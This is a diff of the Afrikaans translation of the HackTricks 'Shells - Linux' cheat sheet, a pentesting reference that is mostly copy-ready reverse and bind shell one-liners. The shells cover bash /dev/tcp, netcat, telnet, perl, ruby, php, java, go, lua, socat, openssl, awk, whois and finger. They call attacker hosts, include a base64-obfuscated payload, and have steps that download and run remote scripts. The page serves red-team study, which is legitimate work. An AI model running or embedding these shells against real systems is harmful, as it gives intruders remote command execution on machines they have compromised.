@@ -1,20 +1,21 @@
-# Skulpe - Linux
+# Shells - Linux
+
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Try Hard Security Group**
+**Probeer Hard Sekuriteitsgroep**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
@@ -22,11 +23,11 @@ Ander maniere om HackTricks te ondersteun:
 
 ***
 
-**As jy vrae het oor enige van hierdie skulpe, kan jy hulle nagaan met** [**https://explainshell.com/**](https://explainshell.com)
+**As jy vrae het oor enige van hierdie shells kan jy dit nagaan met** [**https://explainshell.com/**](https://explainshell.com)
 
-## Volledige TTY
+## Volle TTY
 
-**Sodra jy 'n omgekeerde skulp kry**[ **lees hierdie bladsy om 'n volledige TTY te verkry**](full-ttys.md)**.**
+**Sodra jy 'n omgekeerde shell kry**[ **lees hierdie bladsy om 'n volle TTY te verkry**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -41,9 +42,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Simbool veilige dop
+Moet nie vergeet om met ander shells te kyk nie: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, en bash.
 
-Moenie vergeet om te kontroleer met ander doppe: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, en bash.
+### Simbool veilige shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -52,26 +53,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Skulverduideliking
+#### Shell verduideliking
 
-1. **`bash -i`**: Hierdie deel van die bevel begin 'n interaktiewe (`-i`) Bash-skul.
-2. **`>&`**: Hierdie deel van die bevel is 'n kort notasie vir die **omleiding van beide standaard uitvoer** (`stdout`) en **standaard fout** (`stderr`) na dieselfde bestemming.
-3. **`/dev/tcp/<AANVALLER-IP>/<POORT>`**: Dit is 'n spesiale lêer wat 'n TCP-verbinding met die gespesifiseerde IP-adres en poort **voorstel**.
-* Deur **die uitset- en foutstrome na hierdie lêer om te lei**, stuur die bevel effektief die uitset van die interaktiewe skul-sessie na die aanvaller se masjien.
-4. **`0>&1`**: Hierdie deel van die bevel **lei standaard inset (`stdin`) om na dieselfde bestemming as standaard uitvoer (`stdout`)**.
+1. **`bash -i`**: Hierdie deel van die opdrag begin 'n interaktiewe (`-i`) Bash shell.
+2. **`>&`**: Hierdie deel van die opdrag is 'n kortnotasie vir **om beide standaarduitset** (`stdout`) en **standaardfout** (`stderr`) na die **dieselfde bestemming** te herlei.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is 'n spesiale lêer wat **'n TCP-verbinding na die gespesifiseerde IP-adres en poort** verteenwoordig.
+* Deur **die uitset en foutstrome na hierdie lêer te herlei**, stuur die opdrag effektief die uitset van die interaktiewe shell-sessie na die aanvaller se masjien.
+4. **`0>&1`**: Hierdie deel van die opdrag **herlei standaardinvoer (`stdin`) na die dieselfde bestemming as standaarduitset (`stdout`)**.
 
 ### Skep in lêer en voer uit
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Voorwaartse Skul
+## Forward Shell
 
-Wanneer daar 'n **Remote Code Execution (RCE)** kwesbaarheid binne 'n Linux-gebaseerde webtoepassing hanteer word, kan die bereiking van 'n omgekeerde skul belemmer word deur netwerkverdedigings soos iptables-reëls of ingewikkelde pakketfilteringsmeganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) skul om meer doeltreffend met die gekompromitteerde stelsel te kan interaksieer.
+Wanneer jy te doen het met 'n **Remote Code Execution (RCE)** kwesbaarheid binne 'n Linux-gebaseerde webtoepassing, kan dit wees dat die verkryging van 'n reverse shell belemmer word deur netwerkverdedigings soos iptables-reëls of ingewikkelde pakketfiltermeganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) shell om meer effektief met die gecompromitteerde stelsel te kommunikeer.
 
-'n Aanbevole instrument vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat die interaksie met die teikenumgewing vereenvoudig.
+'n Aanbevole hulpmiddel vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat interaksie met die teikenomgewing vereenvoudig.
 
-Om toboggan doeltreffend te benut, skep 'n Python-module wat toegespits is op die RCE-konteks van jou teikenstelsel. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
+Om toboggan effektief te gebruik, skep 'n Python-module wat aangepas is vir die RCE-konteks van jou teikenstelsel. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
 ```python3
 import jwt
 import httpx
@@ -95,21 +96,21 @@ response.raise_for_status()
 
 return response.text
 ```
-En dan kan jy hardloop:
+En dan kan jy uitvoer:
 ```shell
 toboggan -m nix.py -i
 ```
-Om direk 'n interaktiewe dop te benut. Jy kan `-b` byvoeg vir Burpsuite-integrasie en die `-i` verwyder vir 'n meer basiese rce-omslag.
+Om 'n interaktiewe shell direk te benut. Jy kan `-b` byvoeg vir Burpsuite integrasie en die `-i` verwyder vir 'n meer basiese rce-wrapper.
 
-'n Ander moontlikheid is om die `IppSec` forward shell-implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+'n Ander moontlikheid is om die `IppSec` voorwaartse shell-implementering te gebruik [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-Jy hoef net te wysig:
+Jy moet net die volgende aanpas:
 
 * Die URL van die kwesbare gasheer
-* Die voorvoegsel en agtervoegsel van jou lading (indien enige)
-* Die manier waarop die lading gestuur word (koppe? data? ekstra inligting?)
+* Die voorvoegsel en agtervoegsel van jou payload (indien enige)
+* Die manier waarop die payload gestuur word (koppe? data? ekstra inligting?)
 
-Daarna kan jy net **bevele stuur** of selfs die `upgrade` bevel gebruik om 'n volledige PTY te kry (let daarop dat pype met 'n benaderde vertraging van 1.3s gelees en geskryf word).
+Dan kan jy net **opdragte stuur** of selfs **die `upgrade` opdrag gebruik** om 'n volle PTY te verkry (let daarop dat pype met 'n ongeveer 1.3s vertraging gelees en geskryf word).
 
 ## Netcat
 ```bash
@@ -121,7 +122,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-Kyk dit na by [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
+Kyk dit in [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -132,15 +133,15 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >
 telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
 rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
 ```
-## Wie is
+## Whois
 
 **Aanvaller**
 ```bash
 while true; do nc -l <port>; done
 ```
-Om die bevel te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
+Om die opdrag te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
 
-**Slagoffer**
+**Slachtoffer**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -158,8 +159,6 @@ perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getpro
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
-
-### Afrikaans Translation
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -177,8 +176,6 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 ## Java
-
-Java is 'n programmeertaal wat algemeen gebruik word vir die ontwikkeling van programme en toepassings wat op verskeie platforms kan hardloop. Dit is 'n objek-georiënteerde taal wat baie gewild is vir die ontwikkeling van groot sagtewareprojekte. Java-kode word gewoonlik in platte tekst lêers geskryf met die `.java` lêeruitbreiding. Die kode word dan deur 'n Java-kompilator vertaal na masjienkode wat deur 'n Java virtuele masjien (JVM) uitgevoer kan word.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -194,22 +191,6 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
-
-### Inleiding
-
-Lua is 'n kragtige, effektiewe, klein, en aanpasbare skriptaal wat dikwels gebruik word in die wêreld van sagteware-ontwikkeling. Dit word dikwels gebruik vir die skryf van skripte, konfigurasie, en selfs vir die ontwikkeling van volwaardige sagteware-toepassings. Lua is bekend vir sy vinnige uitvoering en klein geheue-afdruk, wat dit 'n gewilde keuse maak vir verskeie toepassings.
-
-### Lua Skulpaal
-
-Lua-skulpaal is 'n kragtige tegniek wat gebruik word om Lua-skripte uit te voer binne 'n ander program of toepassing. Dit bied die vermoë om dinamies Lua-kode te laai en uit te voer tydens die uitvoering van 'n program. Hierdie tegniek is baie nuttig vir die aanpassing en uitbreiding van sagteware sonder om die bronkode te wysig.
-
-### Lua Skulpaal in Linux
-
-In Linux-omgewings kan Lua-skulpaal gebruik word om sagteware aan te pas, sagteware-uitbreidings te skep, en selfs om sagteware te manipuleer vir spesifieke doeleindes. Dit bied 'n kragtige manier om die funksionaliteit van sagteware uit te brei sonder om die oorspronklike bronkode te wysig. Met Lua-skulpaal kan gebruikers sagteware aanpas en verbeter sonder om diep in die sagteware se interne werking in te gryp.
-
-### Lua Skulpaal Vir Hacking
-
-Vir hackers kan Lua-skulpaal 'n nuttige tegniek wees om sagteware te manipuleer vir hul eie doeleindes. Deur Lua-skripte te gebruik, kan hackers sagteware aanpas, funksionaliteit uitbrei, en selfs nuwe funksies byvoeg sonder om die oorspronklike bronkode te wysig. Hierdie maak dit moontlik vir hackers om sagteware aan te pas vir spioenasie, datakaping, en selfs vir die uitvoering van skadelike aksies sonder om opgespoor te word.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -267,7 +248,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-Die Slagoffer
+Die Slachtoffer
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -279,39 +260,35 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Bind skul
+### Bind shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Omgekeerde dop
+### Terugskakel
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
-
-Awk is 'n kragtige patroonherkenningstaal wat dikwels gebruik word vir die manipulasie van data en die skep van rapporte. Dit kan ook gebruik word as 'n skulpskakel in Linux om data te verwerk en te manipuleer.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Vinger
+## Finger
 
 **Aanvaller**
 ```bash
 while true; do nc -l 79; done
 ```
-Om die bevel te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
+Om die opdrag te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop)
 
-**Slagoffer**
+**Slachtoffer**
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
-
-Gawk is 'n kragtige patroonvergelyking en verwerkingsprogram wat dikwels gebruik word vir data-manipulasie en tekstverwerking.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -336,11 +313,11 @@ close(Service)
 ```
 ## Xterm
 
-Dit sal probeer om met jou stelsel te verbind by poort 6001:
+Dit sal probeer om met jou stelsel te verbind op poort 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Om die omgekeerde dop te vang, kan jy gebruik (wat sal luister op poort 6001):
+Om die omgekeerde shell te vang kan jy gebruik (wat op poort 6001 sal luister):
 ```bash
 # Authorize host
 xhost +targetip
@@ -349,7 +326,7 @@ Xnest :1
 ```
 ## Groovy
 
-deur [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Java omgekeerde dop werk ook vir Groovy
+deur [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) LET WEL: Java reverse shell werk ook vir Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -363,22 +340,23 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Try Hard Security Group**
+**Probeer Hard Sekuriteitsgroep**
 
 <figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Ondersteun HackTricks</summary>
 
-Ander maniere om HackTricks te ondersteun:
-
-* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
 * **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
